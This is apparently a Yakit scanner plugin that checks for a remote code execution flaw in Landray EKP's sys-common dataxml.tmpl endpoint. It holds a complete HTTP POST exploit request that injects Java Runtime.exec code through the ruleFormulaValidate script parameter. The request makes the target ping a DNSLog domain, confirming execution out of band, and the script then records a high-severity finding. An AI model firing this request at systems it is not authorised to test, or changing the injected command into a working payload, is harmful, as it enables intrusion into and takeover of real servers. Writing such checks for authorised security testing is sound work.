# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /ekp/data/sys-common/dataxml.tmpl  HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0)  Gecko/20100101 Firefox/92.0
Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language:  zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 192

s_bean=ruleFormulaValidate&script=try {
String cmd = "ping {{params(dnslog)}}";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) {
System.err.println(e);
}
`

    rand_Payload=str.RandStr(10)
    server,token,err = risk.NewDNSLogDomain()
    die(err)
    yakit.Info("dnslog server addr: %v ",server)
    yakit.Info("dnslog server check token: %v", token)
    reverseURL =  rand_Payload+"."+server


    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target":addr,"dnslog":reverseURL}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )


    detail, _ := risk.CheckDNSLogByToken(token)

    if len(detail) > 0{
        yakit.Info("%v found 蓝凌 EKP sys-common远程代码执行", addr)
        risk.NewRisk(
        addr,
        risk.title("蓝凌 EKP sys-common远程代码执行"),
        risk.severity("high"),
        risk.titleVerbose("蓝凌 EKP sys-common远程代码执行"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
